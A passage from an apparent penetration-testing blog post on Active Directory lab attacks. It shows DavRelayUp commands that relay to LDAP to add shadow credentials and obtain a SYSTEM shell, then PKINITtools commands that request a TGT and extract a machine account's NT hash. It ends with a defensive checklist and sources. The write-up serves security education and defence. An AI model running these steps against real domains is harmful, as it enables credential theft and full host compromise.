.\DavRelayUp-lockscreen.exe spawn -m shadowcred -d sccm.lab -dc DC.sccm.lab -ce <Base64CertOrPath> -cep <CertPassword>
```
![Relaying to LDAP(S) and adding our KeyCredentials and popping a SYSTEM shell](/assets/img/webdav/davrelayup-lockscreen-shadow.png)

Using the base64 certificate and password, we can request the TGT and unpac it to recover the NT hash of the machine account and follow earlier steps to fully compromise the host.
```bash
python3 PKINITtools/gettgtpkinit.py -pfx-base64 $(cat ~/mssql.b64) -pfx-pass '<cert-pass>' -dc-ip $dc_ip $domain/mssql$ target.ccache

export KRB5CCNAME=target.ccache
getnthash.py -dc-ip $dc_ip -key <AS-REP-KEY> $domain/$target$

etc...
```
![Using the obtained cert to request a TGT and unpac the ticket to obtain the NT hash](/assets/img/webdav/davrelayup-shadow-tgt.png)

&nbsp;

---
## Defending against this stuff

If you've made it this far and you are on the blue team, here is the checklist you will ask for anyway:
- Disable WebClient where you do not absolutely need it
- Enforce LDAP signing and channel binding on domain controllers
- Restrict (or ideally phase out) NTLM where possible and clean up legacy NTLM usage
- Restrict who can create machine accounts and ADIDNS records

If you fix just the first two bullet points, WebDAV RBCD and shadow credential tricks won't work anymore so start with those two.

&nbsp;

---
## Sources (just a few)
- [Bussink](https://www.bussink.net/rbcd-WebClient-attack/) 
- [pentestlab](https://pentestlab.blog/2021/10/20/lateral-movement-WebClient/)
- [Dirkjan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
- [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) 
- [DavRelayUp (SharpEfsTrigger)](https://github.com/Dec0ne/DavRelayUp) 
- [DavRelayUp (LockScreen)](https://github.com/BronzeBee/DavRelayUp)
- [TheHacker.recipes](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient) 
- [Specterops shadow creds](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)  
- [Specterops webclient](https://specterops.io/blog/2025/08/19/will-webclient-start/) 
- [Zimnyaa](https://gist.github.com/zimnyaa/dcac97f3106e96053a1acb6ca9974e55) 
- [Gone to the Dogs](https://shenaniganslabs.io/2019/08/08/Lock-Screen-LPE.html) 
- [Kerberos RBCD](https://www.nccgroup.com/research-blog/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) 
- [???????](https://matias.me/nsfw) 
- [Change Lockscreen](https://github.com/nccgroup/Change-Lockscreen) 
- [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/45916e5b-d66f-444e-b1e5-5b0666ed4d66) 
- [msDS-AllowedToActOnBehalfOfOtherIdentity](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/cea4ac11-a4b2-4f2d-84cc-aebb4a4ad405) 
- [WebDAV Redirector](https://learn.microsoft.com/en-us/iis/publish/using-webdav/using-the-webdav-redirector) 


(～￣▽￣)～